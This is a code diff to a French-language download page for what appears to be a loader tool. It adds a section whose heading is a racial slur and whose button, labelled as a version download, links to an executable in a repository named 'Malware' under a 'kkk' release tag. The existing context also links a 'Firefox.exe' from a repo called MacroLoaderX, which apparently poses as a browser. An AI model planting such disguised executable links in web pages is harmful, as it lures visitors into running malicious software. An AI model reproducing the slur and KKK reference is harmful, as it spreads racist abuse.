@@ -261,6 +261,14 @@
             <a href="https://github.com/n0lex9999/MacroLoaderX/releases/download/fire/Firefox.exe" class="btn-primary">Télécharger v2.4.0</a>
         </div>
     </section>
+
+    <section id="download" class="container fade-in">
+        <div class="download-box">
+            <h2>! WOWOWOW NIGGERS !</h2>
+            <p style="color: var(--text-muted); margin: 15px 0 30px; font-size:14px;">>jte v</p>
+            <a href="https://github.com/n0lex9999/Malware/releases/download/kkk/TheTruth.exe" class="btn-primary">Télécharger v2.4.0</a>
+        </div>
+    </section>
     
     <section id="download" class="container fade-in">
         <div class="download-box">
